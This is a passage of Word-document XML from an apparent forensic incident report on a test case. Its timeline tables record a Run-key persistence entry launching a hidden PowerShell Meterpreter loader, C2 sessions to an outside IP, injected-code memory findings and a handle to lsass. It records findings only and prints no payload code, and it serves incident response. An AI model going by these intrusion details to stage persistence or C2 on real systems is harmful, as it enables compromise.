          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1547.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39826</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#39830</w:t>
              <w:br/>
              <w:t>volatility/windows.psscan.PsScan.jsonl#101</w:t>
              <w:br/>
              <w:t>volatility/windows.psscan.PsScan.jsonl#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>persistence / C2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run key "coreupdate" fires: hidden PowerShell Meterpreter loader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EID 600/4104; powershell PID 508 -&gt; PID 3316; new C2 flow port 50972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1547.001 T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#15081</w:t>
              <w:br/>
              <w:t>volatility/windows.psscan.PsScan.jsonl#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:45</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Second Meterpreter session 10.42.85.115:50972 → 203.78.103.109:443 (Run key loader)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pcap 04:08:45 (+1 h); stage transfer alerts Bind_API; memory netscan ESTABLISHED; active until end of capture.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1071 T1095</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
              <w:br/>
              <w:t>volatility/windows.netscan.NetScan.jsonl#114</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>collection (responder)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Responder acquisition: FTK Imager run from USB E: "Incident_drive"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SanDisk Cruzer Glide (serial 4C530000261130109435) connected 05:08:58; E:\FTK Imager\FTK Imager.exe (SHA1 32756b3a319340c4b7fead410d3f36e503b30da2) executed 05:09:56; memory SystemTime 05:10:39.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#54</w:t>
              <w:br/>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USBSTOR.csv#1</w:t>
              <w:br/>
              <w:t>volatility/windows.info.Info.jsonl#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detailed evidence timeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>All the evidence cited by the findings and the timeline, sorted by time.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1814"/>
        <w:gridCol w:w="1984"/>
        <w:gridCol w:w="5669"/>
        <w:gridCol w:w="2438"/>
        <w:gridCol w:w="2551"/>
        <w:gridCol w:w="1020"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Timestamp (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Original source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Cited by</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_info</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Value": "2020-09-19 05:10:39+00:00", "Variable": "SystemTime"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.info.Info.jsonl#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, T-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_image</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"image": "C:\\Sleuthline\\cases\\test04\\memory\\DESKTOP-SDN1RPT.mem", "name": "DESKTOP-SDN1RPT.mem", "bytes": "2147483648", "sha256": "AC6EE0E8C273103B94D776F54192D2C6ACF8303AABBD6A199254030C69F667C3"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/memory_image.jsonl#1</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raw.pcap_files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"file": "C:\\Sleuthline\\cases\\test04\\pcap\\case001.pcap", "name": "case001.pcap", "bytes": "197583252", "sha256": "09ABF49EFEA1852E047987D92907704D47F36D75F6C8056E2CAFA6CC027791CB"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/pcap_files.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.prefetch_timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"RunTime": "2020-09-19 05:08:37.5328773", "ExecutableName": "\\VOLUME{01d68d85e0da1e22-b0e0e8ff}\\WINDOWS\\SYSTEM32\\CMD.EXE"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0_Timeline.csv#55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.prefetch_timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"RunTime": "2020-09-19 05:08:37.6563942", "ExecutableName": "\\VOLUME{01d68d85e0da1e22-b0e0e8ff}\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0_Timeline.csv#308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netscan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "203.78.103.109", "ForeignPort": "443", "LocalAddr": "10.42.85.115", "LocalPort": "50875", "Offset": "209519128050464", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-011, F-017, I-004, I-020, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netscan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "203.78.103.109", "ForeignPort": "443", "LocalAddr": "10.42.85.115", "LocalPort": "50972", "Offset": "209519140929552", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, F-017, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_malfind</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t xml:space="preserve">{"TreeDepth": "0", "CommitCharge": "36", "Disasm": "\"\n0x1840000:\tpop\tr10\n0x1840002:\tnop\t\n0x1840003:\tadd\tbyte ptr [rbx], al\n0x1840005:\tadd\tbyte ptr [rax], al\n0x1840007:\tadd\tbyte ptr [rax + rax], al\n0x184000a:\tadd\tbyte ptr [rax], al\"", "End VPN": "25575423", "File output": "Disabled", "Hexdump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015, I-020, T-027</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"5136", "HandleValue": "1964", "Name": "lsass.exe Pid 656", "Offset": "209519057219712", "PID": "2188", "Process": "spoolsv.exe", "Type": "Process"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.handles.Handles.jsonl#14206</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_handles</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "GrantedAccess": "1048608", "HandleValue": "1912", "Name": "\\Device\\HarddiskVolume3\\Users\\mortysmith\\Desktop", "Offset": "209519093754240", "PID": "2188", "Process": "spoolsv.exe", "Type": "File"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.handles.Handles.jsonl#14195</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netstat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "203.78.103.109", "ForeignPort": "443", "LocalAddr": "10.42.85.115", "LocalPort": "50875", "Offset": "209519128050464", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
